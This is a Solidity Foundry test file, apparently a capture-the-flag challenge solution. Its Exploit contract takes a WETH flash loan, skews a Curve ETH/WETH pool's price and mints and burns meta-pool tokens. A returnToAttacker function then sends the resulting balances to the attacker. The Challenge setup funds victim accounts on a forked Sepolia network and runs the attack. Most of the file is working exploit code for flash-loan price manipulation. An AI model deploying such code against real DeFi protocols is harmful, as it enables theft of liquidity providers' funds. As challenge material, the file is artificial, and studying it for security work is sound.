// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/MetaToken/CurvePool.sol";
import "../src/MetaToken/CurveToken.sol";
import "../src/MetaToken/interfaces/ILendingPool.sol";
import "../src/MetaToken/MetaPoolToken.sol";
import "../src/MetaToken/interfaces/IERC3156.sol";
import "forge-std/console.sol";

contract Exploit is IERC3156FlashBorrower {
    address private immutable attacker;
    address private immutable wethLendingPool;
    address private immutable weth;
    CurvePool private immutable curvePool;
    CurveToken private immutable lpToken;
    MetaPoolToken private immutable metaToken;
    constructor(
        address _attacker,
        address _wethLendingPool,
        address _weth,
        CurvePool _curvePool,
        CurveToken _lpToken,
        MetaPoolToken _metaToken
    ) {
        attacker = _attacker;
        wethLendingPool = _wethLendingPool;
        weth = _weth;
        curvePool = _curvePool;
        lpToken = _lpToken;
        metaToken = _metaToken;
    }

    function setupAttack() public {
        bool success = ILendingPool(wethLendingPool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            weth,
            1 ether,
            abi.encode("")
        );
        require(success, "FlashLoan not initated!");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata /*data*/
    ) external returns (bytes32) {
        require(initiator == address(this), "Not an initator");
        require(token == weth, "Not the same Weth address");
        require(amount > 0, "Amount is Zero");

        // First add liquidity using contract-owned ETH + WETH so it owns LP tokens.
        uint256 poolWeth = IWETH(weth).balanceOf(address(curvePool));
        uint256 addAmt = 0.5 ether;
        uint256[2] memory depositAmounts;
        depositAmounts[0] = addAmt;
        depositAmounts[1] = 0;

        // Give the pool extra WETH for a skewed price before minting MLP.
        IWETH(weth).transfer(address(curvePool), 1000 * poolWeth);

        // Trigger the pool price imbalance.
        uint256 dx = 0.01 ether;
        curvePool.exchange{value: dx}(0, 1, dx, 0);

        // Deposit ETH into the pool to get Curve LP tokens to this contract.
        curvePool.add_liquidity{value: addAmt}(depositAmounts, 0);
        uint256 lp = IERC20(address(lpToken)).balanceOf(address(this));
        require(lp > 0, "No LP tokens minted to exploit contract");

        // Approve and mint MLP using the LP tokens just received.
        IERC20(address(lpToken)).approve(address(metaToken), lp);
        metaToken.mint(lp);

        uint256 mLp = metaToken.balanceOf(address(this));
        require(mLp > 0, "No MLP minted");
        metaToken.burn(mLp);

        // Repay flashloan.
        require(
            IWETH(weth).approve(wethLendingPool, amount + fee),
            "approve failed"
        );

        console.log("Exploit contract ETH balance after flashloan repayment: ", address(this).balance);
        console.log("Exploit contract WETH balance after flashloan repayment: ", IWETH(weth).balanceOf(address(this)));
        console.log("Exploit contract LP token balance after flashloan repayment: ", lpToken.balanceOf(address(this)));

        
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function returnToAttacker() public {
        require(msg.sender == attacker, "Not the attacker");
        IWETH(weth).transfer(attacker, IWETH(weth).balanceOf(address(this)));
        IERC20(address(lpToken)).transfer(attacker, lpToken.balanceOf(address(this)));
        attacker.call{value: address(this).balance}("");
    }

    receive() external payable {}
}

contract Challenge is Test {
    ILendingPool public wethLendingPool;
    CurvePool public swapPoolEthWeth;
    CurveToken public lpToken;
    IWETH public weth;
    MetaPoolToken public metaToken;
    address hacker;
    address alice;
    address bob;

    function setUp() public {
        vm.createSelectFork("https://sepolia.gateway.tenderly.co");

        weth = IWETH(payable(0x1194A239875cD36C9B960FF2d3d8d0f800435290));
        wethLendingPool = ILendingPool(
            0x66Df966E887e73b2f46456e062213B0C0fB42037
        );
        assertEq(address(wethLendingPool.WETH()), address(weth));
        assertEq(address(wethLendingPool.WETH()), address(weth));
        lpToken = new CurveToken();
        swapPoolEthWeth = new CurvePool(
            msg.sender,
            [0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, address(weth)],
            // LP token ka address
            address(lpToken),
            5,
            4000000,
            5000000000
        );
        lpToken.initialize(address(swapPoolEthWeth));
        metaToken = new MetaPoolToken(lpToken, swapPoolEthWeth);
        // deal(address(lpToken), address(metaToken), 10000 ether, true);

        hacker = makeAddr("hacker");
        alice = makeAddr("alice");
        bob = makeAddr("bob");

        uint[2] memory amounts; // = [10 ether, 10 ether];
        amounts[0] = 10 ether;
        amounts[1] = 10 ether;

        deal(alice, 20 ether);
        vm.startPrank(alice);

        weth.deposit{value: 10 ether}();
        assertEq(weth.balanceOf(alice), 10 ether, "alice failed");
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        // @dev the user is adding => 10 eth / 10 weth
        swapPoolEthWeth.add_liquidity{value: 10 ether}(amounts, 0);

        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(alice));
        assertGt(metaToken.balanceOf(alice), 0);
        vm.stopPrank();

        // amounts = [20 ether, 20 ether] and 20 ether;
        amounts[0] = 20 ether;
        amounts[1] = 20 ether;

        deal(bob, 40 ether);
        vm.startPrank(bob);

        weth.deposit{value: 20 ether}();
        assertEq(weth.balanceOf(bob), 20 ether, "bob failed");
        weth.approve(address(swapPoolEthWeth), type(uint).max);
        // 20 ether , 20 weth
        swapPoolEthWeth.add_liquidity{value: 20 ether}(amounts, 0);

        lpToken.approve(address(metaToken), type(uint).max);
        metaToken.mint(lpToken.balanceOf(bob));
        assertGt(metaToken.balanceOf(bob), 0);
        vm.stopPrank();

        // Provide initial liquidity to lending pool (and lots of it!)
        deal(address(this), type(uint256).max - 70 ether);
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(wethLendingPool), weth.balanceOf(address(this)));

        // Provide hacker with some ETH to start with
        deal(hacker, 10 ether);
    }

    function testHack_meta() public {
        uint lendingPoolWethBalance = weth.balanceOf(address(wethLendingPool));

        vm.startPrank(hacker, hacker);
        console.log(
            "current liquidity added : ",
            weth.balanceOf(address(swapPoolEthWeth))
        );
        console.log(
            "current balance of ether :  ",
            address(swapPoolEthWeth).balance
        );

        console.log("LP token balance of Bob , ", lpToken.balanceOf(bob));
        //Your Solution

        Exploit exploit = new Exploit(
            hacker,
            address(wethLendingPool),
            address(weth),
            swapPoolEthWeth,
            lpToken,
            metaToken
        );
        (bool success, ) = address(exploit).call{value: hacker.balance}("");
        require(success, "Not fullfiled from hacker to exploit contract");
        exploit.setupAttack();
        exploit.returnToAttacker();
        vm.stopPrank();
        
    }
}
